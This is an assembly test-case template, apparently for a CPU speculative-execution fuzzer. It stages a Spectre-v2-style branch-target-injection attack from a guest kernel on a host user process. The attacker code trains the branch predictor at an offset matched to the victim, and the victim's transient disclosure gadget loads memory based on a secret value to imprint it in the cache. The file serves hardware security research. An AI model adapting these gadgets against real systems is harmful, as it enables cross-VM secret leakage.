.intel_syntax noprefix

# ============================================================================
# vbti_gs->hu, transient redesign + fixed-offset alignment.
#
# same transient-only principle as template-gs2hu-transient.asm (victim's arch
# path is inert; only a mispredict reaches the disclosure), plus deterministic
# btb alignment so the injection can actually land:
#
#   - attacker `train` is the first function in its section (offset 0), mirroring
#     the victim's `function_victim_1` (also offset 0), so their indirect jmps sit
#     at the same in-section offset (btb source-index collision, low 12 bits; both
#     code bases are page-aligned).
#   - the attacker's train gadget copies the victim's prefix byte-for-byte (same
#     8-byte landing placeholder, same 6 loads, no random preamble) so the jmp
#     offset matches exactly.
#   - the attacker pads a `safe`-sized block (14 b, = victim_safe) between its jmp
#     and its `disclosure`, so attacker_disclosure and victim_disclosure land at
#     the same offset (btb target-index alignment).
#
# caveat: this only controls the sub-page (low-12) bits. if the cpu's btb indexes
# on bits above 12, the host vs guest code bases (which differ there) still won't
# collide and it will stay clean -- that would be a genuine negative for this setup.
# ============================================================================

# ----------------------------- host orchestrator ----------------------------
.section .data.main
.function_main_0:
.macro.set_h2g_target.attacker.function_attacker_0: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_1: nop qword ptr [rax + 0xff]
.macro.switch_h2g.attacker.0: nop qword ptr [rax + 0xff]

.function_main_1:
.macro.landing_g2h.main_1: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.attacker.function_attacker_train: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_2: nop qword ptr [rax + 0xff]
.macro.switch_h2g.attacker.1: nop qword ptr [rax + 0xff]

.function_main_2:
.macro.landing_g2h.main_2: nop qword ptr [rax + 0xff]
.macro.set_k2u_target.victim.function_victim_1: nop qword ptr [rax + 0xff]
.macro.set_u2k_target.main.function_main_3: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.switch_k2u.victim.1: nop qword ptr [rax + 0xff]

.function_main_3:
.macro.landing_u2k.main_3: nop qword ptr [rax + 0xff]
.macro.fault_handler: nop qword ptr [rax + 0xff]
.patch_placeholder_fault_handler:
.macro.set_h2g_target.attacker.function_attacker_measure: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_4: nop qword ptr [rax + 0xff]
.macro.switch_h2g.attacker.2: nop qword ptr [rax + 0xff]

.function_main_4:
.macro.landing_g2h.main_4: nop qword ptr [rax + 0xff]
nop


# ----------------------------- attacker (guest kernel, observer) ------------
# note: function_attacker_train is placed first (offset 0) to mirror victim_1.
.section .data.attacker
.function_attacker_train:
.macro.landing_h2g.attacker_1: nop qword ptr [rax + 0xff]
# mirror the victim's prefix exactly (same 6 loads at fixed addrs -> fixed,
# input-independent footprint; values are not used as addresses, so no leak).
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rax, qword ptr [rip + .function_attacker_disclosure]  # noremove
jmp rax  # noremove                                       # trains btb[this pc] = disclosure

# 14-byte pad matching victim_safe (lfence + switch(8) + lfence); skipped by the jmp.
.function_attacker_safe:
lfence  # noremove
.macro.switch_g2h.main.attacker_safe: nop qword ptr [rax + 0xff]
lfence  # noremove

.function_attacker_disclosure:
lfence  # noremove   (architectural jmp target; inert)
.macro.switch_g2h.main.attacker_1: nop qword ptr [rax + 0xff]
lfence

.function_attacker_0:
.macro.landing_h2g.attacker_0: nop qword ptr [rax + 0xff]
.macro.measurement_start.attacker_0: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.attacker_0: nop qword ptr [rax + 0xff]
lfence

.function_attacker_measure:
.macro.landing_h2g.attacker_2: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.macro.measurement_end.attacker_2: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- victim (host user) ---------------------------
.section .data.victim
.function_victim_1:
.macro.landing_k2u.victim_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove   (secret input in rax)
mov rbx, qword ptr [r14 + 0x2008] # noremove
mov rcx, qword ptr [r14 + 0x2010] # noremove
mov rdx, qword ptr [r14 + 0x2018] # noremove
mov rsi, qword ptr [r14 + 0x2020] # noremove
mov rdi, qword ptr [r14 + 0x2028] # noremove
mfence # noremove
lea rbx, qword ptr [rip + .function_victim_safe]  # noremove
jmp rbx  # noremove                     # arch -> safe;  mispredict -> disclosure

.function_victim_safe:
lfence  # noremove
.macro.switch_u2k.main.1: nop qword ptr [rax + 0xff]
lfence

.function_victim_disclosure:
and rax, 0b1111111111111  # noremove
mov rcx, qword ptr [r14 + rax]   # noremove   (transient: secret-dependent load)
and rcx, 0b1111111111111  # noremove
mov rdx, qword ptr [r14 + rcx]   # noremove   (transient: imprint into cache)
lfence  # noremove
.macro.switch_u2k.main.2: nop qword ptr [rax + 0xff]
lfence


# ----------------------------- exit -----------------------------------------
.section .data.main
.test_case_exit:nop
